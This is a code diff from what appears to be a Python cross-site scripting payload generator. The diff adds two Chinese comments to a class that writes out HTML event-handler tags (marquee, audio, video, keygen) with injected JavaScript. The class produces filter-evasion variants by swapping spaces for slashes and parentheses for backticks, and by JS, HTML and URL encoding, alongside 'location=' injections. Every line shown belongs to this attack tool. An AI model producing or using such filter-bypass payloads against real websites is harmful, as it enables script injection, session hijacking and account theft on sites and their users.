@@ -34,7 +34,7 @@ class make_payload():
 						,"<marquee onstart=*>","<audio src onloadstart=*","<video src=\"_\" onloadstart=\"*\">","<video><source onerror=\"javascript:*\">","<keygen autofocus onfocus=*>"]
 		with open(self.tag_file,"w") as f:
 			for i in payload_arr:
-				tem_payload=self.js_encode(self.payload[:5])
+				tem_payload=self.js_encode(self.payload[:5])# js加密函数名
 				f.write(i.replace("*",self.payload)+"\n")
 				f.write(i.replace("*",self.payload).replace(" ","/")+"\n")# 空格--> /
 				f.write(i.replace("*",self.payload).replace("(","`").replace(")","`")+"\n") #() ---> ``
@@ -63,6 +63,7 @@ class make_payload():
 			f.write((self.js_encode(self.payload[:5])+"(668868)").replace("(","`").replace(")","`")+"\n")
 			f.write(self.html_encode(self.protocal + self.js_encode(self.payload[:5])+"(668868)")+"\n")
 			f.write(self.html_encode(self.protocal + self.js_encode(self.payload[:5])+"(668868)").replace("(","`").replace(")","`" + "\n"))
+			# 添加location属性，可以进行url编码
 			f.write("=location=\"{}{}\">\n".format(self.protocal,self.js_encode(self.payload[:5])+"(668868)"))
 			f.write("=location=\"{}{}\">\n".format(self.protocal,self.js_encode(self.payload[:5])+"`668868`"))
 			f.write("=location=\"{}{}\">\n".format(self.protocal,self.url_encode(self.payload)))
